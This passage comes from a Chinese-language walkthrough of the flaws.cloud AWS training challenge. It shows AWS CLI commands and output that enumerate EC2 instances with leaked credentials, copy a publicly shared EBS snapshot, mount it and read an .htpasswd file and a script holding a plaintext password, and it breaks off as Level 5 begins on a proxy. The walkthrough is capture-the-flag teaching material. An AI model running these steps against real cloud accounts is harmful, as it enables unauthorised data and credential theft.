EC2 shortly after nginx was setup on it.</p></blockquote><p>我们的目标是进入<code>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</code>，直接用浏览器打开，提示需要账号密码：</p><p><img src="https://p4.ssl.qhimg.com/t01702b4808c239fe1a.png"></p><p><img src="https://p1.ssl.qhimg.com/t01cd5df690a898e118.png"></p><p>在level 4 挑战的描述中，我们知道，当nginx在EC2上部署后，会创建一个快照（EBS snapshot）。由这一思路出发，利用level 3中取得的账户查询flaws上运行的EC2实例的信息:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 describe-instances --profile flaws</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Reservations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Instances&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Monitoring&quot;: &#123;</span><br><span class="line">                        &quot;State&quot;: &quot;disabled&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;PublicDnsName&quot;: &quot;ec2-35-165-182-7.us-west-2.compute.amazonaws.com&quot;,</span><br><span class="line">                    &quot;StateReason&quot;: &#123;</span><br><span class="line">                        &quot;Message&quot;: &quot;&quot;,</span><br><span class="line">                        &quot;Code&quot;: &quot;&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;State&quot;: &#123;</span><br><span class="line">                        &quot;Code&quot;: 16,</span><br><span class="line">                        &quot;Name&quot;: &quot;running&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;EbsOptimized&quot;: false,</span><br><span class="line">                    &quot;LaunchTime&quot;: &quot;2017-02-12T22:29:24.000Z&quot;,</span><br><span class="line">                    &quot;PublicIpAddress&quot;: &quot;35.165.182.7&quot;,</span><br><span class="line">                    &quot;PrivateIpAddress&quot;: &quot;172.31.41.84&quot;,</span><br><span class="line">                    &quot;ProductCodes&quot;: [],</span><br><span class="line">                    &quot;VpcId&quot;: &quot;vpc-1052ce77&quot;,</span><br><span class="line">                    &quot;CpuOptions&quot;: &#123;</span><br><span class="line">                        &quot;CoreCount&quot;: 1,</span><br><span class="line">                        &quot;ThreadsPerCore&quot;: 1</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;StateTransitionReason&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;InstanceId&quot;: &quot;i-05bef8a081f307783&quot;,</span><br><span class="line">                    &quot;ImageId&quot;: &quot;ami-7c803d1c&quot;,</span><br><span class="line">                    &quot;PrivateDnsName&quot;: &quot;ip-172-31-41-84.us-west-2.compute.internal&quot;,</span><br><span class="line">                    &quot;KeyName&quot;: &quot;Default&quot;,</span><br><span class="line">                    &quot;SecurityGroups&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;GroupName&quot;: &quot;launch-wizard-1&quot;,</span><br><span class="line">                            &quot;GroupId&quot;: &quot;sg-490f6631&quot;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;ClientToken&quot;: &quot;kTOiC1486938563883&quot;,</span><br><span class="line">                    &quot;SubnetId&quot;: &quot;subnet-d962aa90&quot;,</span><br><span class="line">                    &quot;InstanceType&quot;: &quot;t2.micro&quot;,</span><br><span class="line">                    &quot;CapacityReservationSpecification&quot;: &#123;</span><br><span class="line">                        &quot;CapacityReservationPreference&quot;: &quot;open&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;NetworkInterfaces&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;Status&quot;: &quot;in-use&quot;,</span><br><span class="line">                            &quot;MacAddress&quot;: &quot;06:b0:7a:92:21:cf&quot;,</span><br><span class="line">                            &quot;SourceDestCheck&quot;: true,</span><br><span class="line">                            &quot;VpcId&quot;: &quot;vpc-1052ce77&quot;,</span><br><span class="line">                            &quot;Description&quot;: &quot;&quot;,</span><br><span class="line">                            &quot;NetworkInterfaceId&quot;: &quot;eni-c26ed780&quot;,</span><br><span class="line">                            &quot;PrivateIpAddresses&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    &quot;PrivateDnsName&quot;: &quot;ip-172-31-41-84.us-west-2.compute.internal&quot;,</span><br><span class="line">                                    &quot;PrivateIpAddress&quot;: &quot;172.31.41.84&quot;,</span><br><span class="line">                                    &quot;Primary&quot;: true,</span><br><span class="line">                                    &quot;Association&quot;: &#123;</span><br><span class="line">                                        &quot;PublicIp&quot;: &quot;35.165.182.7&quot;,</span><br><span class="line">                                        &quot;PublicDnsName&quot;: &quot;ec2-35-165-182-7.us-west-2.compute.amazonaws.com&quot;,</span><br><span class="line">                                        &quot;IpOwnerId&quot;: &quot;amazon&quot;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ],</span><br><span class="line">                            &quot;PrivateDnsName&quot;: &quot;ip-172-31-41-84.us-west-2.compute.internal&quot;,</span><br><span class="line">                            &quot;InterfaceType&quot;: &quot;interface&quot;,</span><br><span class="line">                            &quot;Attachment&quot;: &#123;</span><br><span class="line">                                &quot;Status&quot;: &quot;attached&quot;,</span><br><span class="line">                                &quot;DeviceIndex&quot;: 0,</span><br><span class="line">                                &quot;DeleteOnTermination&quot;: true,</span><br><span class="line">                                &quot;AttachmentId&quot;: &quot;eni-attach-a4901fc2&quot;,</span><br><span class="line">                                &quot;AttachTime&quot;: &quot;2017-02-12T22:29:24.000Z&quot;</span><br><span class="line">                            &#125;,</span><br><span class="line">                            &quot;Groups&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    &quot;GroupName&quot;: &quot;launch-wizard-1&quot;,</span><br><span class="line">                                    &quot;GroupId&quot;: &quot;sg-490f6631&quot;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ],</span><br><span class="line">                            &quot;Ipv6Addresses&quot;: [],</span><br><span class="line">                            &quot;OwnerId&quot;: &quot;975426262029&quot;,</span><br><span class="line">                            &quot;PrivateIpAddress&quot;: &quot;172.31.41.84&quot;,</span><br><span class="line">                            &quot;SubnetId&quot;: &quot;subnet-d962aa90&quot;,</span><br><span class="line">                            &quot;Association&quot;: &#123;</span><br><span class="line">                                &quot;PublicIp&quot;: &quot;35.165.182.7&quot;,</span><br><span class="line">                                &quot;PublicDnsName&quot;: &quot;ec2-35-165-182-7.us-west-2.compute.amazonaws.com&quot;,</span><br><span class="line">                                &quot;IpOwnerId&quot;: &quot;amazon&quot;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;SourceDestCheck&quot;: true,</span><br><span class="line">                    &quot;Placement&quot;: &#123;</span><br><span class="line">                        &quot;Tenancy&quot;: &quot;default&quot;,</span><br><span class="line">                        &quot;GroupName&quot;: &quot;&quot;,</span><br><span class="line">                        &quot;AvailabilityZone&quot;: &quot;us-west-2a&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;Hypervisor&quot;: &quot;xen&quot;,</span><br><span class="line">                    &quot;BlockDeviceMappings&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;DeviceName&quot;: &quot;/dev/sda1&quot;,</span><br><span class="line">                            &quot;Ebs&quot;: &#123;</span><br><span class="line">                                &quot;Status&quot;: &quot;attached&quot;,</span><br><span class="line">                                &quot;DeleteOnTermination&quot;: true,</span><br><span class="line">                                &quot;VolumeId&quot;: &quot;vol-04f1c039bc13ea950&quot;,</span><br><span class="line">                                &quot;AttachTime&quot;: &quot;2017-02-12T22:29:25.000Z&quot;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;Architecture&quot;: &quot;x86_64&quot;,</span><br><span class="line">                    &quot;RootDeviceType&quot;: &quot;ebs&quot;,</span><br><span class="line">                    &quot;IamInstanceProfile&quot;: &#123;</span><br><span class="line">                        &quot;Id&quot;: &quot;AIPAIK7LV6U6UXJXQQR3Q&quot;,</span><br><span class="line">                        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:instance-profile/flaws&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;RootDeviceName&quot;: &quot;/dev/sda1&quot;,</span><br><span class="line">                    &quot;VirtualizationType&quot;: &quot;hvm&quot;,</span><br><span class="line">                    &quot;HibernationOptions&quot;: &#123;</span><br><span class="line">                        &quot;Configured&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;MetadataOptions&quot;: &#123;</span><br><span class="line">                        &quot;State&quot;: &quot;applied&quot;,</span><br><span class="line">                        &quot;HttpEndpoint&quot;: &quot;enabled&quot;,</span><br><span class="line">                        &quot;HttpTokens&quot;: &quot;optional&quot;,</span><br><span class="line">                        &quot;HttpPutResponseHopLimit&quot;: 1</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;AmiLaunchIndex&quot;: 0</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ReservationId&quot;: &quot;r-0fe151dbbe77e90cc&quot;,</span><br><span class="line">            &quot;Groups&quot;: [],</span><br><span class="line">            &quot;OwnerId&quot;: &quot;975426262029&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在返回的信息中，在<code>EBS</code>中找到<code>VolumeId</code>，在<code>Association</code>中找到公有IP</p><p><img src="https://p5.ssl.qhimg.com/t01cb1c4ac118142b80.png"></p><p><img src="https://p0.ssl.qhimg.com/t01dab8ab43585c552b.png"></p><p>也就是说，有一个EC2实例在运行，它的<code>VolumeId</code>为<code>vol-04f1c039bc13ea950</code>，IP地址为<code>35.165.182.7</code>。</p><p>为了确认这一发现，利用<code>nslookup</code>工具对level 4中的EC2地址进行解析，发现IP对应一致：</p><p><img src="https://p1.ssl.qhimg.com/t01e8a1ea1ccebfd490.png"></p><p>那么，下一步要做到的就是通过<code>VolumeId</code>寻找EBS快照，看看能不能发现有用的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 describe-snapshots --filters &quot;Name=volume-id, Values=vol-04f1c039bc13ea950&quot; --profile flaws</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Snapshots&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Description&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Tags&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Value&quot;: &quot;flaws backup 2017.02.27&quot;,</span><br><span class="line">                    &quot;Key&quot;: &quot;Name&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Encrypted&quot;: false,</span><br><span class="line">            &quot;VolumeId&quot;: &quot;vol-04f1c039bc13ea950&quot;,</span><br><span class="line">            &quot;State&quot;: &quot;completed&quot;,</span><br><span class="line">            &quot;VolumeSize&quot;: 8,</span><br><span class="line">            &quot;StartTime&quot;: &quot;2017-02-28T01:35:12.000Z&quot;,</span><br><span class="line">            &quot;Progress&quot;: &quot;100%&quot;,</span><br><span class="line">            &quot;OwnerId&quot;: &quot;975426262029&quot;,</span><br><span class="line">            &quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里找到<code>&quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;</code>，接着检查这个快照的<code>createVolumePermission</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;,</span><br><span class="line">    &quot;CreateVolumePermissions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Group&quot;: &quot;all&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哇偶！每个人都能基于这个快照创建一个卷。那么现在就使用自己的AWS账号创建这个快照的卷，这样就能使用自己的SSH秘钥登录EC2实例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;AvailabilityZone&quot;: &quot;us-west-2a&quot;,</span><br><span class="line">    &quot;MultiAttachEnabled&quot;: false,</span><br><span class="line">    &quot;Tags&quot;: [],</span><br><span class="line">    &quot;Encrypted&quot;: false,</span><br><span class="line">    &quot;VolumeType&quot;: &quot;gp2&quot;,</span><br><span class="line">    &quot;VolumeId&quot;: &quot;vol-00b0a21eafbe8f81b&quot;,</span><br><span class="line">    &quot;State&quot;: &quot;creating&quot;,</span><br><span class="line">    &quot;Iops&quot;: 100,</span><br><span class="line">    &quot;SnapshotId&quot;: &quot;snap-0b49342abd1bdcb89&quot;,</span><br><span class="line">    &quot;CreateTime&quot;: &quot;2020-03-22T08:43:49.000Z&quot;,</span><br><span class="line">    &quot;Size&quot;: 8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我自己账户的EC2管理平台上，可以看到基于这个快照的卷成功创建：</p><p><img src="https://p0.ssl.qhimg.com/t0146400bfcb5c37686.png"></p><p>随后我开启了一个免费的EC2实例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 describe-instances</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &quot;InstanceId&quot;: &quot;i-056b17b87e47e8896&quot;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面将卷挂载在/dev/sdf：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~$ aws ec2 attach-volume --volume-id vol-00b0a21eafbe8f81b --instance-id i-056b17b87e47e8896 --device /dev/sdf</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    &quot;State&quot;: &quot;attaching&quot;,</span><br><span class="line">    &quot;Device&quot;: &quot;/dev/sdf&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们用自己的SSH秘钥登录这个EC2实例，就能进入快照找寻敏感信息或者文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~$ ssh -i &lt;mykey&gt; ubuntu@34.*.*.*.*</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-1057-aws x86_64)Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-1057-aws x86_64)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ubuntu@ip-172-31-21-33:~$ lsblk</span><br><span class="line">NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0     7:0    0 89.1M  1 loop /snap/core/8268</span><br><span class="line">loop1     7:1    0   18M  1 loop /snap/amazon-ssm-agent/1480</span><br><span class="line">xvda    202:0    0    8G  0 disk</span><br><span class="line">└─xvda1 202:1    0    8G  0 part /</span><br><span class="line">xvdf    202:80   0    8G  0 disk</span><br><span class="line">└─xvdf1 202:81   0    8G  0 part</span><br></pre></td></tr></table></figure><p>可以发现这里有个虚拟盘/dev/xvdf1，创建一个挂载点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:~$ sudo mkdir /mnt/flaws</span><br><span class="line">ubuntu@ip-172-31-21-33:~$ sudo mount /dev/xvdf1 /mnt/flaws</span><br><span class="line">ubuntu@ip-172-31-21-33:~$ mount</span><br><span class="line">...</span><br><span class="line">/dev/xvdf1 on /mnt/flaws type ext4 (rw,relatime,data=ordered)</span><br></pre></td></tr></table></figure><p>下面进入，看看能发现什么：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:~$ ls -l /mnt/flaws/</span><br><span class="line">total 104</span><br><span class="line">drwxr-xr-x  2 root root  4096 Feb 13  2017 bin</span><br><span class="line">drwxr-xr-x  3 root root  4096 Feb 22  2017 boot</span><br><span class="line">drwxr-xr-x  5 root root  4096 Jan 13  2017 dev</span><br><span class="line">drwxr-xr-x 94 root root  4096 Feb 19  2017 etc</span><br><span class="line">drwxr-xr-x  3 root root  4096 Feb 12  2017 home</span><br><span class="line">lrwxrwxrwx  1 root root    32 Feb 22  2017 initrd.img -&gt; boot/initrd.img-4.4.0-64-generic</span><br><span class="line">lrwxrwxrwx  1 root root    32 Feb 21  2017 initrd.img.old -&gt; boot/initrd.img-4.4.0-63-generic</span><br><span class="line">drwxr-xr-x 21 root root  4096 Jan 13  2017 lib</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 lib64</span><br><span class="line">drwx------  2 root root 16384 Jan 13  2017 lost+found</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 media</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 mnt</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 opt</span><br><span class="line">drwxr-xr-x  2 root root  4096 Apr 12  2016 proc</span><br><span class="line">drwx------  3 root root  4096 Feb 19  2017 root</span><br><span class="line">drwxr-xr-x  6 root root  4096 Jan 13  2017 run</span><br><span class="line">drwxr-xr-x  2 root root 12288 Feb 13  2017 sbin</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan  3  2017 snap</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 srv</span><br><span class="line">drwxr-xr-x  2 root root  4096 Feb  5  2016 sys</span><br><span class="line">drwxrwxrwt  8 root root  4096 Feb 28  2017 tmp</span><br><span class="line">drwxr-xr-x 10 root root  4096 Jan 13  2017 usr</span><br><span class="line">drwxr-xr-x 14 root root  4096 Feb 12  2017 var</span><br><span class="line">lrwxrwxrwx  1 root root    29 Feb 22  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-64-generic</span><br><span class="line">lrwxrwxrwx  1 root root    29 Feb 21  2017 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-63-generic</span><br></pre></td></tr></table></figure><p>看起来很像一个linux系统，从哪里找到包含认证信息的文件呢？还记得level 4 描述中讲到的“当nginx在EC2上部署后，会创建一个快照”吗？所以nginx是突破点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ ls -al</span><br><span class="line"></span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x  6 root root 4096 Feb 19  2017 .</span><br><span class="line">drwxr-xr-x 94 root root 4096 Feb 19  2017 ..</span><br><span class="line">-rw-r--r--  1 root root   44 Feb 13  2017 .htpasswd</span><br><span class="line">drwxr-xr-x  2 root root 4096 Oct 27  2016 conf.d</span><br><span class="line">-rw-r--r--  1 root root 1077 Apr 26  2016 fastcgi.conf</span><br><span class="line">-rw-r--r--  1 root root 1007 Apr 26  2016 fastcgi_params</span><br><span class="line">-rw-r--r--  1 root root 2837 Apr 26  2016 koi-utf</span><br><span class="line">-rw-r--r--  1 root root 2223 Apr 26  2016 koi-win</span><br><span class="line">-rw-r--r--  1 root root 3957 Apr 26  2016 mime.types</span><br><span class="line">-rw-r--r--  1 root root 1533 Feb 19  2017 nginx.conf</span><br><span class="line">-rw-r--r--  1 root root  180 Apr 26  2016 proxy_params</span><br><span class="line">-rw-r--r--  1 root root  636 Apr 26  2016 scgi_params</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb 19  2017 sites-available</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb 19  2017 sites-enabled</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb 12  2017 snippets</span><br><span class="line">-rw-r--r--  1 root root  664 Apr 26  2016 uwsgi_params</span><br><span class="line">-rw-r--r--  1 root root 3071 Apr 26  2016 win-utf</span><br></pre></td></tr></table></figure><p><code>.htpasswd</code>文件看起来很可疑：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ cat .htpasswd</span><br><span class="line"></span><br><span class="line">flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0</span><br></pre></td></tr></table></figure><p>这应该是一串加密的密码，账户：flaws，密码（加密）：$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0。尝试在<a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</a>进行登录，没有成功，应该需要明文密码。</p><p>继续寻找可疑的目录和文件，在/home/ubuntu/中发现了一个可疑脚本<code>setupNginx.sh</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ cat setupNginx.sh</span><br><span class="line">htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</span><br></pre></td></tr></table></figure><p><code>nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code>应该就是明文密码。尝试登录，成功通关level 4：</p><p><img src="https://p0.ssl.qhimg.com/t01c66ffd1bf052121f.png"></p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul><li>在AWS中允许创建EC2的快照，这样做的主要目的是进行备份。但当忘记密码时，能够使用快照来访问EC2实例，而这也恰恰是攻击者感兴趣的地方。</li></ul><h2 id="0x06-Level-5"><a href="#0x06-Level-5" class="headerlink" title="0x06 Level 5"></a>0x06 Level 5</h2><blockquote><p>This EC2 has a simple HTTP only proxy on it. Here are some examples of it’s usage:</p><ul><li><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/</a></li><li><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml</a></li><li><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/</a></li></ul><p>See if you can use this proxy to figure out how to list the contents of the level6 bucket at <a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/">level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</a> that has a hidden directory in it</p></blockquote><p>在EC2实例上有一个简单的HTTP代理，需要用这个代理，找到level 6存储桶中的隐藏目录。</p><p>尝试直接在浏览器中访问<code>level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</code>，得到的结果是<code>Access Denied</code>:</p><p><img src="https://p3.ssl.qhimg.com/t01294894165c74933a.png"></p><p>level 5 的EC2实例给我们提供了一个代理，目标点应该就在<a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/</a> 里面寻找。</p><p>在level 